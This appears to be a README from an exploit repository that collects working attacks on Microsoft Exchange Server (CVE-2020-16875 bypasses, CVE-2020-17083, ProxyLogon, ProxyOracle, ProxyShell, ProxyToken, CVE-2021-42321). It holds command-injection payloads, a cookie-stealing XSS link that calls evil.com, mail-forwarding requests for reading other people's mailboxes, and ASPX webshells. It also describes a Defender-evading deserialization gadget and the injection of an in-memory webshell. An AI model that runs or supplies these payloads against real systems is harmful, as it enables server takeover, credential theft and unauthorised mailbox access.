 - [CVE-2020-16875 Protection/Filter Bypass](https://raw.githubusercontent.com/x41sec/advisories/master/X41-2020-007/x41mas-2020-007-microsoft-exchange-rce.txt)
 - [Microsoft Exchange Remote Code Execution - CVE-2020-16875](https://www.x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/)


 - origin payload:

``` bash
$i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c %s";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start()
```

以下bypass payload直接替换[cve-2020-16875](./CVE-2020-16875/cve-2020-16875.py)poc脚本中的原poc代码即可，补丁绕过原理及手法分析以上文章链接写的很清楚

 - ![](./pics/CVE-2020-17132.png)

 - bypass1:

``` bash
neW-tRaNsPoRtRuLe $([Diagnostics.Process]::Start("cmd", "/c %s")) #-dLpPoLiCy

neW-tRaNsPoRtRuLe fdvoid0; [Diagnostics.Process]::Start("cmd", "/c %s") #-dLpPoLiCy
```

 - bypass2:

``` bash
neW-tRaNsPoRtRuLe fdvoid0; $poc='New-object'; $i = & $poc System.Diagnostics.ProcessStartInfo; $i.UseShellExecute = $true; $i.FileName="cmd"; $i.Arguments="/c %s"; $r = & $poc System.Diagnostics.Process; $r.StartInfo = $i; $r.Start() #-dLpPoLiCy
```

 - bypass3:

``` bash
neW-tRaNsPoRtRuLe $([Diagnostics.Process]::Start("cmd", "/c %s")) -DlpPolicy "%%DlpPolicyName%%"
```

 - bypass4:

``` bash
& 'Invoke-Expression' '[Diagnostics.Process]::Start("cmd","/c %s")'; New-TransportRule -DlpPolicy
```

# CVE-2020-17083 (completed)
## CVE-2020-17083 part links

 - [Microsoft Exchange Server ExportExchangeCertificate WriteCertiricate File Write Remote Code Execution Vulnerability](https://srcincite.io/pocs/cve-2020-17083.ps1.txt)
 - [CVE-2020-17083：Exchange Authed Rce 分析](https://mp.weixin.qq.com/s/sC9rN4NhO9a6Q-uQWNXa7Q)

 - 影响exchange版本

``` bash
Microsoft Exchange Server 2013 Cumulative Update 23
Microsoft Exchange Server 2016 Cumulative Update 17
Microsoft Exchange Server 2016 Cumulative Update 18
Microsoft Exchange Server 2019 Cumulative Update 6
Microsoft Exchange Server 2019 Cumulative Update 7
```

| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| 测试成功 | Exchange Server 2016 累计更新 CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |
| 测试成功 | Exchange Server 2013 累计更新 23 (KB4489622) 15.00.1497.002 | Exchange2013-x64-cu23.exe | 2021/5/3 | 1.6 GB |

此漏洞是由于ExportExchangeCertificate WriteCertiricate文件写入功能导致的。远程攻击者可以利用这一点，通过精心构造的HTTP请求在应用程序上下文中执行任意代码。

 - (ab)用户需要分配"Exchange Server Certificates"角色

``` bash
[PS] C:\Windows\system32>New-RoleGroup -Name "cert users" -Roles "Exchange Server Certificates" -Members "administrator"

Name       AssignedRoles                  RoleAssignments                           ManagedBy
----       -------------                  ---------------                           ---------
cert users {Exchange Server Certificates} {Exchange Server Certificates-cert users} {exchange2016.com/Microsoft Exchange Secur
                                                                                    ity Groups/Organization Management, exchan
                                                                                    ge2016.com/Users/Administrator}

[PS] C:\Windows\system32>Get-RoleGroup "cert users" | Format-List


RunspaceId                  : ded4f6c8-e011-42e3-b68e-5b9a3beb1e5d
ManagedBy                   : {exchange2016.com/Microsoft Exchange Security Groups/Organization Management, exchange2016.com/U
                              sers/Administrator}
RoleAssignments             : {Exchange Server Certificates-cert users}
Roles                       : {Exchange Server Certificates}
DisplayName                 :
ExternalDirectoryObjectId   :
Members                     : {exchange2016.com/Users/Administrator}
SamAccountName              : cert users
Description                 :
RoleGroupType               : Standard
LinkedGroup                 :
Capabilities                : {}
LinkedPartnerGroupId        :
LinkedPartnerOrganizationId :
Identity                    : exchange2016.com/Microsoft Exchange Security Groups/cert users
IsValid                     : True
ExchangeVersion             : 0.10 (14.0.100.0)
Name                        : cert users
DistinguishedName           : CN=cert users,OU=Microsoft Exchange Security Groups,DC=exchange2016,DC=com
Guid                        : b912e05a-5bfe-4846-90fb-9fbdf15ec412
ObjectCategory              : exchange2016.com/Configuration/Schema/Group
ObjectClass                 : {top, group}
WhenChanged                 : 2023/11/16 10:14:11
WhenCreated                 : 2023/11/16 10:14:11
WhenChangedUTC              : 2023/11/16 2:14:11
WhenCreatedUTC              : 2023/11/16 2:14:11
OrganizationId              :
Id                          : exchange2016.com/Microsoft Exchange Security Groups/cert users
OriginatingServer           : WIN-UPF09R7H264.exchange2016.com
ObjectState                 : Changed
```

 - ![](./pics/cve-2020-17083.png)

 - 漏洞复现

原powershell poc需要在域内环境中使用，直接在存在漏洞的exchange本机复现，若要实现非域环境远程RCE功能需要修改为python版本exp，并更换python powershell执行命令的端点，目前暂未找到合适的实现方法

 - [cve-2020-17083.ps1](./CVE-2020-17083/cve-2020-17083.ps1)

``` bash
PS C:\Users\Administrator\Desktop> .\cve-2020-17083.ps1 -server WIN-UPF09R7H264.exchange2016.com
-usr administrator@exchange2016.com -pwd 123456Wx.. -cmd mspaint
(+) targeting WIN-UPF09R7H264.exchange2016.com with administrator@exchange2016.com:123456Wx..
(+) wrote to target file C:/Windows/Temp/BIAHDTaO.hta
(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/Mo3LwKhN
.aspx
(+) shell written, executing command...
(+) executed mspaint as SYSTEM!
```

 - ![](./pics/cve-2020-17083-1.png)

``` bash
PS C:\Users\Administrator\Desktop> .\cve-2020-17083.ps1 -server WIN-2FFDIR22V0Q.exchange2013.com -usr administrator@exchange2013.com -pwd 123456Wx.. -cmd mspaint
(+) targeting WIN-2FFDIR22V0Q.exchange2013.com with administrator@exchange2013.com:123456Wx..
(+) wrote to target file C:/Windows/Temp/HZkLQyCX.hta
(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/X98xek1r.aspx
(+) shell written, executing command...
(+) executed mspaint as SYSTEM!
```

 - ![](./pics/cve-2020-17083-2.png)

# CVE-2020-17143
## CVE-2020-17143 part links

 - [Microsoft Exchange Server OWA OneDriveProUtilities GetWacUrl XML External Entity Processing Information Disclosure Vulnerability](https://srcincite.io/pocs/cve-2020-17143.py.txt)

# CVE-2020-17144
## CVE-2020-17144 part links

 - [CVE-2020-17144漏洞分析与武器化](https://www.zcgonvh.com/post/analysis_of_CVE-2020-17144_and_to_weaponizing.html)
 - [CVE-2020-17144 zcgonvh github exp](https://github.com/zcgonvh/CVE-2020-17144)
 - [Exchange2010 authorized RCE](https://github.com/Airboi/CVE-2020-17144-EXP)

# CVE-2021-24085
## CVE-2021-24085 part links

 - [Hunting Down MS Exchange Attacks. Part 2 (CVE-2020–0688, CVE-2020–16875, CVE-2021–24085)](https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-2-cve-2020-0688-cve-2020-16875-cve-2021-24085-8355ec0917c)



# CVE-2021-28482
## CVE-2021-28482 part links




# ProxyLogon (completed)
## ProxyLogon part links

 - [Proxylogon](https://proxylogon.com/)
 - [A New Attack Surface on MS Exchange Part 1 - ProxyLogon!](https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html)
 - [ProxyLogon漏洞分析](https://hosch3n.github.io/2021/08/22/ProxyLogon%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
 - [复现Microsoft Exchange Proxylogon漏洞利用链](https://xz.aliyun.com/t/9305)

 - 漏洞影响exchange版本信息

``` bash
Exchange Server 2019 < 15.02.0792.010
Exchange Server 2019 < 15.02.0721.013
Exchange Server 2016 < 15.01.2106.013
Exchange Server 2013 < 15.00.1497.012
```

 - ![](pics/proxylogon.png)
 - ![](pics/proxylogon1.png)
 - ![](pics/proxylogon2.png)

# ProxyOracle (completed)
## ProxyOracle part links

 - [A New Attack Surface on MS Exchange Part 2 - ProxyOracle!](https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html)
 - [ProxyOracle漏洞分析](https://hosch3n.github.io/2021/08/23/ProxyOracle%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

 - 影响版本

CVE-2021-31195
``` bash
Exchange Server 2013 < May21SU
Exchange Server 2016 < May21SU < CU21
Exchange Server 2019 < May21SU < CU10
```

CVE-2021-31196
``` bash
Exchange Server 2013 < Jul21SU
Exchange Server 2016 < Jul21SU
Exchange Server 2019 < Jul21SU
```

Once a victim clicks this link, evil.com will receive the cookies.

``` bash
https://ews.lab/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};document.cookie=`X-AnonResource-Backend=@evil.com:443/path/any.php%23~1941962753`;document.cookie=`X-AnonResource=true`;fetch(`/owa/auth/any.skin`,{credentials:`include`});//
```

or use 3gstudent's way:

## step1: XSS平台搭建

借助SSRF漏洞，控制Exchange服务器将Cookie信息发送至XSS平台，导致最终想要的Cookie信息位于Request Headers中

而现有的XSS平台大都是通过POST请求的参数来传递数据

为了解决这个问题，这里可以选择开源的XSS平台，地址如下：

https://github.com/3gstudent/pyXSSPlatform

只需要修改以下位置：

 - 修改index.js，使用ajax模拟用户发包触发SSRF漏洞

 - 修改 pyXSSPlatform.py ，将GET请求的Request Headers进行提取

 - 使用合法的证书

index.js代码示例：

``` bash
var xmlHttp = new XMLHttpRequest();
xmlhttp.open("GET", "https://192.168.1.1/owa/auth/x.js", false);
document.cookie = "X-AnonResource=true";
document.cookie = "X-AnonResource-Backend=OurXssServer.com/#~1";
xmlhttp.send();
```

## step2: XSS利用代码

控制用户访问XSS平台的代码示例：

``` bash
https://192.168.1.1/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};document.head.appendChild(document.createElement(/script/.source)).src=/https:\/\/OurXssServer.com\/index.js/.source//
```

## step3: example cookie for decryption test:

``` bash
cadata=FVtSAAWdOn29HYDQry+kG+994VUdAxONrayi4nbJW9JWTh8yLueD6IxYpahfxcGsA/B3FoVUQOD2EG605SR4QdeQ1pof+KD//6jwpmYQjv/II+OcqChrFZFvcMWv46a5; cadataTTL=eTxCEHKHDMmd/gEqDuOafg==; cadataKey=T4juhN4dUMKY4wkajUD43n4EWfMwefPQlqzxXmK4GnSHIZqo+g+uQg1Y2ogGoD1HyoVpRYgjGcCu6rmNQK+LsaZ8/lfBCThBI5yAhP1W2Fx+YNKvzy8Bcpui7zTlhAY598lE5Aijs6crHVXJeZkbLfMJgp0cFHj5uTQPcg31O/AeOAnD5c27IYOQ7JqMW7GOUVor1lhYnhh0R/NtWWqyfr5oE9j0jbxIGgrQrXIpLxL/uAU1ddC+/5jG9Edpq4sC213amuU/94rkHYzNH9OsiHYIkXr/NmkB7p908XrFrwXAcvV9QieoRiS3jvKCbzk3mnMu3YTnsJwAuiHzSXdCOQ==; cadataIV=GB9B+rwrigyPOf8xnV1KAek++yovEot9jFcV68WepCTQoRtQ5HUxSC7tE1mmHg0YtE6EOZNUM/WiNGP6xI4UTAofcMOfTLeRpBzeaKOETfjxKK2W7IKn+9k2tRkc1pIlO8FTOVx/dOHOoIFHUkqxFr+TgBULJ1I7tUmO7W0XDX4ZJHfmQhVqOOzeyjImKdX7Uv/jIJrF4VEew7rgvrC8BhqOqWgaTxpGhDTzIXl+wW3crsgZmXpXhOPURej1iwmtvhuQU6iuq4/IRv0lVIW3WvP6gUI8owIUxppnJl7YmN27Aqkjs0nTZZz1LBuZN+YxY4x6Lvs2FMG68jllhE4kwg==; cadataSig=BOJSYN2B+3RsXjO2akh3mqlKKkeAZVamOzfpVo0QdPEA3BHjpR6ls5yD9TzAQzRuWJJaaRIm7wMEiBMFz/sK5jk3R6kWw1OmMtJN2c38PdvwGIe6/7ByJdl52a5ojhDrRZhc4Qc3y+FFRx6XKvqUljTRWtHJGI1Jad2+LiNhJGkalhUeTM/a2V4LiQWf6Vv1KzJO79rZuOOOBnatht/E29j6636FpllCfEKrrogPQ7ADdVS6OOmqNU9gRMVgKnomC2t2PCtuYj26HUjnZ3rfc6BdzVmtu9EYSzccObsB2jxXXclAm5a+NZU/6sj9tlq3gcurjBl9yUDTgbZLg383gw==
```

 - amd64 poc binary usage:
 - just a modyfied version of [padre](https://github.com/glebarez/padre), added proxyoracle detect poc code...
 - ![](pics/proxyoracle.png)

 - python script exp usage:

Decrypt this cookie to plaintext:

 - ![](pics/proxyoracle1.png)

# ProxyShell (completed)
## ProxyShell part links

 - [My Steps of Reproducing ProxyShell](https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/)
 - [ProxyShell漏洞分析](https://hosch3n.github.io/2021/08/24/ProxyShell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
 - [FROM PWN2OWN 2021: A NEW ATTACK SURFACE ON MICROSOFT EXCHANGE - PROXYSHELL!](https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell)
 - [Reproducing The ProxyShell Pwn2Own Exploit](https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1)
 - [ProxyShell](https://github.com/ktecv2000/ProxyShell)
 - [A basic proxyshell scanner](https://github.com/dinosn/proxyshell)
 - [Generate proxyshell payload by Py Permutative Encoding](https://github.com/Ridter/proxyshell_payload)
 - [CVE-2021-34473-Exchange-ProxyShell](https://github.com/je6k/CVE-2021-34473-Exchange-ProxyShell)
 - [Exchange ProxyShell 远程代码执行漏洞复现](https://www.buaq.net/go-83692.html)
 - [exchange-proxyshell漏洞复现及分析](https://blog.riskivy.com/exchange-proxyshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/)
 - [Proof of Concept Exploit for Microsoft Exchange CVE-2021-34473, CVE-2021-34523, CVE-2021-31207](https://github.com/horizon3ai/proxyshell)

## short intro

 - 影响exchange版本信息

CVE-2021-34473 & CVE-2021-34523
``` bash
Exchange Server 2013 < Apr21SU
Exchange Server 2016 < Apr21SU < CU21
Exchange Server 2019 < Apr21SU < CU10
```

CVE-2021-31207
``` bash
Exchange Server 2013 < May21SU
Exchange Server 2016 < May21SU < CU21
Exchange Server 2019 < May21SU < CU10
```

 - CVE-2021-34473 - Pre-auth Path Confusion

This faulty URL normalization lets us access an arbitrary backend URL while running as the Exchange Server machine account. Although this bug is not as powerful as the SSRF in ProxyLogon, and we could manipulate only the path part of the URL, it’s still powerful enough for us to conduct further attacks with arbitrary backend access.

``` bash
https://xxx.xxx.xxx.xxx/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@foo.com
```

 - CVE-2021-34523 - Exchange PowerShell Backend Elevation-of-Privilege
 - CVE-2021-31207 - Post-auth Arbitrary-File-Write

## let's getting started and split proxyshell part to part ......

generate proxyshell specified webshell payload.

 - [proxyshell_payload_gen.py](./proxyshell/proxyshell_payload_gen.py)

just put the webshell content you want to "webshell", then it will be fine...

 - ![](pics/proxyshell.png)

then put the encoded webshell to <t:Content>...</t:Content> in chkproxyshell.go

confirm proxyshell and get the sid value to generate token.

 - ![](pics/proxyshell1.png)

use the following py script to gen token value

 - ![](pics/proxyshell2.png)

confirm the token is valid

 - ![](pics/proxyshell3.png)

now use the token to send a email with shell attachment in, this may be saved as a draft in test user's mailbox...

 - ![](pics/proxyshell4.png)

 - ![](pics/proxyshell5.png)

 - ![](pics/proxyshell6.png)

finnaly use the following wsman python script to export The draft to webshell, sometimes may write shell failed, try one more time will be fine :)

 - ![](pics/proxyshell7.png)

 - ![](pics/proxyshell8.png)

 - ![](pics/proxyshell9.png)

access the shell and then execute the commands you want:

``` bash
view-source:https://192.168.186.130//aspnet_client/redhedh.aspx?cmd=Response.Write(Response.Write('eeeeeeeeeeeeeeeeeeee lUc1f3r11 is here!!!!'));
```

shell is just work fine!!!

 - ![](pics/proxyshell10.png)

command exec:

``` bash
view-source:https://192.168.186.130//aspnet_client/redhedh.aspx?cmd=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami /all").StdOut.ReadAll());
```

 - ![](pics/proxyshell11.png)
 - ![](pics/proxyshell12.png)

## exploit proxyshell by using one click shell scripts from github

 - [proxyshell-auto](https://github.com/Udyz/proxyshell-auto)
 - [ProxyShell: More Ways for More Shells](https://www.horizon3.ai/proxyshell-more-ways-for-more-shells/)
 - ![](pics/proxyshell13.png)

## Pwn2Own 2021 Microsoft 3rd Exchange Exploit Chain (proxyshell but intresting exploit script)
### links

 - [Pwn2Own 2021 Microsoft Exchange Exploit Chain](https://blog.viettelcybersecurity.com/pwn2own-2021-microsoft-exchange-exploit-chain/)
 - [Pwn2Own2021MSExchangeExploit.py](https://gist.github.com/rskvp93/4e353e709c340cb18185f82dbec30e58)


# ProxyToken (completed)
## ProxyToken part links

 - [PROXYTOKEN: AN AUTHENTICATION BYPASS IN MICROSOFT EXCHANGE SERVER](https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server)
 - [CVE-2021-33766-ProxyToken](https://github.com/demossl/CVE-2021-33766-ProxyToken)
 - [CVE-2021-33766](https://github.com/bhdresh/CVE-2021-33766)

 - 影响exchange版本信息

``` bash
<= July 2021 Exchange cumulative updates.
```

## proxytoken复现

 - Note: 此漏洞可被用来进行exchange邮箱窃取，钓鱼，社工角色伪装等，只需邮箱名无需任何密码即可利用

### burpsuite请求包分析

1. 第一步发送如下请求包查看proxytoken漏洞是否存在，其中test@exchange2016.com是攻击者想要读取邮件的那个邮箱地址

``` bash
GET /ecp/test@exchange2016.com/PersonalSettings/HomePage.aspx?showhelp=false HTTP/1.1
Host: 192.168.186.130
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: SecurityToken=x
```

返回响应包页面状态为200，响应头中存在"msExchEcpCanary="及值，代表漏洞存在

 - ![](pics/proxytoken.png)

2. 第二步发送如下请求包，构造邮件转发规则到test@exchange2016.com邮箱，后续所有administrator@exchange2016.com发送给test@exchange2016.com邮箱的邮件，都会被重新转发一份给proxymail@exchange2016.com邮箱，从而实现任意邮箱读取

``` bash
POST /ecp/test@exchange2016.com/RulesEditor/InboxRules.svc/Newobject?msExchEcpCanary=FrgLJ_16A0Wr_5nhVivj6vBJGbdFFtsIzwQBoOvKIiUzB1yV5wMJqzG8oRfNd1HWUKm33fyrJ-I. HTTP/1.1
Host: 192.168.186.130
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: SecurityToken=x
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 327


{"properties":{"RedirectTo":[{"RawIdentity":"proxymail@exchange2016.com","DisplayName":"proxymail@exchange2016.com","Address":"proxymail@exchange2016.com","AddressOrigin":0,"galContactGuid":null,"RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"proxymail@exchange2016.com"}],"Name":"Testrule","StopProcessingRules":true}}
```

返回响应包页面状态为200，响应内容如下，代表漏洞存在

``` bash
{"d":{"__type":"RuleRowResults:ECP","Cmdlets":["New-InboxRule"],"ErrorRecords":[],"Informations":[],"IsDDIEnabled":false,"Warnings":[],"Output":null}}
```

 - ![](pics/proxytoken1.png)

### golang proxytoken one click exploit

 - [proxytoken.go](./proxytoken/proxytoken.go)
 - Use Options:

``` bash
-te: is the email that you want to redirect to...
-ve: is the email that you want to attack and read the email ...
```

 - ![](pics/proxytoken2.png)

邮件转发规则修改结果

 - ![](pics/proxytoken3.png)

邮件发送测试，如下图，所有administrator@exchange2016.com发送给test@exchange2016.com邮箱的邮件，都会被重新转发一份给proxymail@exchange2016.com邮箱

 - ![](pics/proxytoken4.png)
 - ![](pics/proxytoken5.png)
 - ![](pics/proxytoken6.png)

# Exchange Authenticated RCE CVE-2021-42321 (completed)
## CVE-2021-42321 part links

 - [Get started with EWS client applications](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/get-started-with-ews-client-applications)
 - [Phân tích bản vá tháng 11 của Microsoft Exchange](https://blog.khonggianmang.vn/phan-tich-ban-va-thang-11-cua-microsoft-exchange/)
 - [CVE-2021-42321](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321)
 - [Some notes about Microsoft Exchange Deserialization RCE (CVE-2021–42321)](https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852)
 - [DotNet安全-CVE-2021-42321漏洞复现](https://mp.weixin.qq.com/s/t6aVu1Nk-1xXcs-ohdBnig)
 - [Exchange漏洞系列分析二【Exchange 反序列化代码执行漏洞 (CVE-2021–42321)】](https://mp.weixin.qq.com/s/V3UIT7xJmV5iJ33-kFAAhQ)
 - [Exchange 反序列化漏洞分析（一）](https://mp.weixin.qq.com/s/QSE4trL-AOgvChJ8UTp7OQ)
 - vuln version & patched version go to [How Tanium Can Help with the November 2021 Exchange Vulnerabilities (CVE-2021-42321)](https://community.tanium.com/s/article/How-Tanium-Can-Help-with-the-November-2021-Exchange-Vulnerabilities-CVE-2021-42321)
 - [exch_CVE-2021-42321](https://github.com/7BitsTeam/exch_CVE-2021-42321)
 - [CVE-2021-42321-天府杯Exchange 反序列化漏洞分析](https://www.wangan.com/p/7fygf33f38821d6b)
 - [CVE-2021-42321_poc.py](./exch_CVE-2021-42321/CVE-2021-42321_shell_write_exp.py)

Exchange 2016 CU 21,22 and Exchange 2019 CU 10,11. This means the only recent latest version of Exchange 2016,2019 are vulnerable to this CVE

1. Create UserConfiguration with BinaryData as our Gadget Chain
2. Request to EWS for GetClientAccessToken to trigger the Deserialization

 - vulnerable exchange versions

``` bash
Exchange Server 2016 CU22 <= Oct21SU 15.1.2375.12 15.01.2375.012
Exchange Server 2016 CU21 <= Oct21SU 15.1.2308.15 15.01.2308.015
Exchange Server 2019 CU11 <= Oct21SU 15.2.986.9 15.02.0986.009
Exchange Server 2019 CU10 <= Oct21SU 15.2.922.14 15.02.0922.014
```

 - 本地测试exchange环境(Exchange Server 2016 未安装任何安全更新):

| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| 测试成功 | Exchange Server 2016 累计更新 22 (KB5005333) 15.01.2375.007 | ExchangeServer2016-x64-CU22.ISO | 2021/9/24 | 6.6 GB |
| 测试失败 | Security Update For Exchange Server 2016 CU22 (KB5008631) 15.01.2375.018 | Exchange2016-KB5008631-x64-zh-hans.msp | 2022/1/11 | 151.2 MB |


## 直接修改ysoserial.net为写入aspx webshell

实际在利用的过程中遇到的500错误，原因是从ProxyLogon, ProxyShell开始，直到现在一些edr,AV,sysmon和Microsoft Windows Defender都试图捕获和阻止来自w3wp.exe进程的衍生进程。所以w3wp进程启动的进程被Definder拦截了。

这样的话只要修改ysoserial的代码功能为写文件即可利用，而不用启动其它进程。

修改后[TypeConfuseDelegateGenerator](./exch_CVE-2021-42321/TypeConfuseDelegateGenerator.cs)

 - ![](./pics/TypeConfuseDelegateGenerator.png)

与原来的[TypeConfuseDelegateGenerator-origin](./exch_CVE-2021-42321/TypeConfuseDelegateGenerator-origin.cs)对比

 - ![](./pics/TypeConfuseDelegateGenerator1.png)

``` bash
TypeConfuse链改为写入文件，即可绕过 windows definder 的 w3wp.exe启动进程。
将此文件覆盖ysoserial.net原始文件，重新编译即可。
```

然后运行如下命令生成gadget chain:

``` bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "1" -t
```

替换原poc中的gadget，即可成功写入webshell

修改了原poc，添加了写入如下两种shell的gadget chain:

 - luci.aspx

``` bash
a<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>
```

 - atobshell.aspx

``` bash
a<%@ Page Language=\'JScript\' Debug=\'true\'%><%@Import Namespace=\'System.IO\'%><%File.WriteAllBytes(Request[\'b\'], Convert.FromBase64String(Request[\'a\']));%>
```

 - [CVE-2021-42321_shell_write_exp.py](./exch_CVE-2021-42321/CVE-2021-42321_shell_write_exp.py)

运行脚本，成功写入两个webshell，方便后续各种操作

 - ![](./pics/TypeConfuseDelegateGenerator2.png)

 - ![](./pics/TypeConfuseDelegateGenerator3.png)

``` bash
view-source:https://192.168.186.135/aspnet_client/luci.aspx?cmd=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami /all").StdOut.ReadAll());
```

 - ![](./pics/TypeConfuseDelegateGenerator4.png)

## 添加植入内存马gadget chain

change DisableActivitySurrogateSelectorTypeCheck to True to overcome the limitation of .NET and later inject DLL to achieve mem-shell with Jscript to bypass the detection

### .net mem-shell researchs resources

1. 首先在注入memory shell之前，需要将DisableActivitySurrogateSelectorTypeCheck更改为True以绕开.NET的限制，这里使用[ysoserial.net](https://github.com/pwntester/ysoserial.net)官方仓库的ClaimsPrincipal + ActivitySurrogateDisableTypeCheck相结合的gadget chain

Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.

``` bash
.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust
```

将这个ClaimsPrincipal+ActivitySurrogateDisableTypeCheck反序列化链添加到[CVE-2021-42321_shell_write_exp.py](./CVE-2021-42321_shell_write_exp.py) exp脚本中

 - ![](./pics/memshell2.png)

 - ![](./pics/memshell3.png)

将DisableActivitySurrogateSelectorTypeCheck更改为True以绕开.NET的限制后，使用弹计算器的TypeConfuseDelegate未修改版本gadget chain在目标上弹出计算器，以确认DisableActivitySurrogateSelectorTypeCheck成功更改为True

 - origin TypeConfuseDelegate chain

``` bash
.\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "calc" -t
```

 - ![](./pics/memshell13.png)

2. 此处通过反序列化生成内存马的方式主要参考：

 - [DotNet内存马-HttpListener](https://mp.weixin.qq.com/s/zsPPkhCZ8mhiFZ8sAohw6w)
 - [.Net 内存马改造](https://cloud.tencent.com/developer/article/1915652)
 - [Memshell-HttpListener](https://github.com/A-D-Team/SharpMemshell/tree/main/HttpListener)

按照Memshell-HttpListener的github仓库中的说明编译内存马的.dll文件

``` bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Web.dll,System.dll,Microsoft.CSharp.dll,System.Core.dll /t:library memshell.cs
```

编译完之后会在目录下生成一个memshell.dll文件，将其改名为e.dll后续生成反序列化链需要用到

 - [HttpListener - e.dll](./HttpListener/e.dll)
 - ![](./pics/memshell.png)

将e.dll文件复制到ysoserial.exe的bin目录中

 - ![](./pics/memshell1.png)

现在生成加载e.dll，注入内存马的ClaimsPrincipal + ActivitySurrogateSelector结合的gadget chain

[ActivitySurrogateSelectorGenerator.cs](./ysoserial.net-modified/ysoserial/Generators/ActivitySurrogateSelectorGenerator.cs)文件中加载e.dll的流程

 - ![](./pics/memshell4.png)
 - ![](./pics/memshell5.png)

及自带的Disable ActivitySurrogate type protections during generation功能

 - ![](./pics/memshell6.png)

``` bash
.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateSelector --minify --ust
```

将这个ClaimsPrincipal+ActivitySurrogateSelector反序列化链添加到[CVE-2021-42321_shell_write_exp.py](./exch_CVE-2021-42321/CVE-2021-42321_shell_write_exp.py) exp脚本中

 - ![](./pics/memshell7.png)
 - ![](./pics/memshell8.png)

 - 本地测试最终exp

1. exp运行前:

 - ![](./pics/memshell9.png)

2. 运行exp脚本，一键注入.net内存马

 - ![](./pics/memshell10.png)

3. 查看内存马命令执行效果

``` bash
curl http://192.168.186.135/favicon.ico -H "Type: cmd"  -d "pass=whoami"
```

 - ![](./pics/memshell11.png)
 - ![](./pics/memshell12.png)


#### note: 后续会另开一个github仓库深入分析.net内存马原理和实战利用方式
 - [asp.net无法getshell的一些解决办法](https://y4er.com/posts/aspnet-getshell-tips/)
 - [浅谈DotNET 内存马 Filter](https://www.crisprx.top/archives/547)
 - [浅谈 DotNet 内存马 Route](https://www.crisprx.top/archives/552)
 - [浅谈 DotNet 内存马 HttpListener](https://www.crisprx.top/archives/555)
 - [ASP.NET下的内存马(1) filter内存马](https://tttang.com/archive/1408/)
 - [ASP.NET下的内存马(2) Route内存马](https://tttang.com/archive/1420/)
 - [ASP.NET下的内存马(3) HttpListener内存马](https://tttang.com/archive/1451/)
 - [ASP.NET下的内存马(4) VirtualPath内存马](https://tttang.com/archive/1488/)
 - [渗透技巧——利用虚拟文件隐藏ASP.NET Webshell](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-Webshell)
